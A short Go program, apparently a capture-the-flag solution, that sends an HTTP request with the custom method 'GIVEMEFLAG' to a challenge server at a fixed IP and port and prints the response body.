package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func stepOne() {
	url := "http://140.115.59.7:12002/"
	method := "GIVEMEFLAG"

	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("Host", "140.115.59.7:12002")
	req.Header.Set("Referer", "http://140.115.59.7:12002/")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error making request:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)
			return
		}
		fmt.Println(string(body))
	}
}

func main() {
	stepOne()
}
